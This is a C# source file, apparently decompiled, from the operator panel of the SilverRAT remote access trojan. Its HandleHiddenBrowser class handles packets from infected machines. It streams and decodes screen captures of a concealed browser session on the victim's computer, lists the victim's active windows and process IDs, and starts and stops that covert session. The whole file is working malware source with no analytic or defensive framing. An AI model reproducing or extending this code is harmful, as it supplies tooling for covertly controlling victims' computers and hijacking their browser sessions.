using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using SilverRAT.StreamLibrary.UnsafeCodecs;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleHiddenBrowser
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "Capture":
                    {
                        HiddenBrowser hiddenBrowser8 = (HiddenBrowser)Application.OpenForms["HBrowser:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenBrowser8 != null)
                        {
                            byte[] asBytes = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                            lock (hiddenBrowser8.syncPicbox)
                            {
                                using (MemoryStream inStream = new MemoryStream(asBytes))
                                {
                                    Bitmap bitmap = (Bitmap)(hiddenBrowser8.GetImage = hiddenBrowser8.decoder.DecodeData(inStream));
                                    hiddenBrowser8.rdSize = bitmap.Size;
                                    if (!hiddenBrowser8.Speed.Checked)
                                    {
                                        hiddenBrowser8.decoder = new UnsafeStreamCodec(Convert.ToInt32(hiddenBrowser8.QualityTrackBar.Value));
                                    }
                                }
                                hiddenBrowser8.ViewerBox.Image = hiddenBrowser8.GetImage;
                                hiddenBrowser8.FPS++;
                                if (hiddenBrowser8.sw.ElapsedMilliseconds >= 1000L)
                                {
                                    BunifuLabel infoFPS = hiddenBrowser8.InfoFPS;
                                    int fPS = hiddenBrowser8.FPS;
                                    infoFPS.Text = "FPS: " + fPS + " | Size: " + Methods.BytesToString(asBytes.Length);
                                    hiddenBrowser8.SizeScreen.Text = hiddenBrowser8.ViewerBox.Image.Width + ":" + hiddenBrowser8.ViewerBox.Image.Height;
                                    hiddenBrowser8.FPS = 0;
                                    hiddenBrowser8.sw = Stopwatch.StartNew();
                                }
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "Start":
                    {
                        HiddenBrowser hiddenBrowser7 = (HiddenBrowser)Application.OpenForms["HBrowser:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenBrowser7 != null)
                        {
                            hiddenBrowser7.Power.Enabled = true;
                            hiddenBrowser7.Power.Text = "Stop";
                            Program.Silver.TransitionHiddeng.HideSync(hiddenBrowser7.PanelMune);
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Stop":
                    {
                        HiddenBrowser hiddenBrowser2 = (HiddenBrowser)Application.OpenForms["HBrowser:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenBrowser2 != null)
                        {
                            hiddenBrowser2.Power.Enabled = true;
                            hiddenBrowser2.Power.Text = "Start";
                            hiddenBrowser2.InfoFPS.Text = "";
                            try
                            {
                                if (hiddenBrowser2.decoder != null)
                                {
                                    hiddenBrowser2.decoder = new UnsafeStreamCodec(hiddenBrowser2.QualityTrackBar.Value);
                                }
                                if (hiddenBrowser2.ViewerBox.Image != null)
                                {
                                    hiddenBrowser2.ViewerBox.Image = null;
                                }
                                break;
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.ToString());
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "ClearUnsafeCode":
                    {
                        HiddenBrowser hiddenBrowser6 = (HiddenBrowser)Application.OpenForms["HBrowser:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (hiddenBrowser6 != null)
                            {
                                hiddenBrowser6.decoder = new UnsafeStreamCodec(Convert.ToInt32(hiddenBrowser6.QualityTrackBar.Value));
                            }
                            else
                            {
                                client.Disconnected();
                            }
                            break;
                        }
                        catch
                        {
                            break;
                        }
                    }
                case "IsBlack":
                    {
                        HiddenBrowser hiddenBrowser3 = (HiddenBrowser)Application.OpenForms["HBrowser:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (hiddenBrowser3 != null)
                            {
                                hiddenBrowser3.ViewerBox.Image = null;
                            }
                            else
                            {
                                client.Disconnected();
                            }
                            break;
                        }
                        catch
                        {
                            break;
                        }
                    }
                case "Logs":
                    {
                        HiddenBrowser hiddenBrowser4 = (HiddenBrowser)Application.OpenForms["HBrowser:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (hiddenBrowser4 != null)
                            {
                                if (bool.Parse(unpack_msgpack.ForcePathObject("State").AsString))
                                {
                                    hiddenBrowser4.Logs.ForeColor = Color.Black;
                                }
                                else
                                {
                                    hiddenBrowser4.Logs.ForeColor = Color.Red;
                                }
                                hiddenBrowser4.Logs.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                            }
                            else
                            {
                                client.Disconnected();
                            }
                            break;
                        }
                        catch
                        {
                            break;
                        }
                    }
                case "WindowsActive":
                    {
                        HiddenBrowser hiddenBrowser5 = (HiddenBrowser)Application.OpenForms["HBrowser:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenBrowser5 != null)
                        {
                            hiddenBrowser5.ListWindowssActive.Rows.Clear();
                            string asString = unpack_msgpack.ForcePathObject("List").AsString;
                            string[] array = asString.Split(new string[1] { "-==>" }, StringSplitOptions.None);
                            int num;
                            for (num = 0; num <= array.Length - 1; num++)
                            {
                                if (array[num].Length > 0)
                                {
                                    string text = array[num];
                                    string index = array[num + 1];
                                    Image icon = Image.FromStream(new MemoryStream(Convert.FromBase64String(array[num + 2])));
                                    string pID = array[num + 3];
                                    AddToListProcess(unpack_msgpack.ForcePathObject("ID").AsString, hiddenBrowser5.ListWindowssActive, icon, new FileInfo(text).Name, index, pID, text);
                                }
                                num += 3;
                            }
                            hiddenBrowser5.CountWindows.Text = "Active : " + hiddenBrowser5.ListWindowssActive.RowCount;
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Actived":
                    {
                        HiddenBrowser hiddenBrowser = (HiddenBrowser)Application.OpenForms["HBrowser:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenBrowser != null)
                        {
                            if (hiddenBrowser.Client == null)
                            {
                                hiddenBrowser.Client = client;
                                hiddenBrowser.LoaderConnect.Visible = false;
                                hiddenBrowser.TimerIsDisconnect.Start();
                                hiddenBrowser.Power.Enabled = true;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }

    public void AddToListProcess(string IDForm, Guna2DataGridView DGV, Image Icon, string name, string Index, string PID, string Path)
    {
        try
        {
            HiddenBrowser HBrowser = (HiddenBrowser)Application.OpenForms["HBrowser:" + IDForm];
            if (HBrowser == null || HBrowser.Client == null)
            {
                return;
            }
            DataGridViewRow item = new DataGridViewRow
            {
                Height = 24
            };
            item.Cells.Add(new DataGridViewImageCell
            {
                Value = Icon,
                ImageLayout = DataGridViewImageCellLayout.Zoom
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = name
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = Index
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = PID
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = Path
            });
            if (HBrowser.InvokeRequired)
            {
                HBrowser.Invoke((MethodInvoker)delegate
                {
                    lock (HBrowser.syncList)
                    {
                        DGV.Rows.Insert(0, item);
                    }
                });
                return;
            }
            lock (HBrowser.syncList)
            {
                DGV.Rows.Insert(0, item);
            }
        }
        catch
        {
        }
    }
}
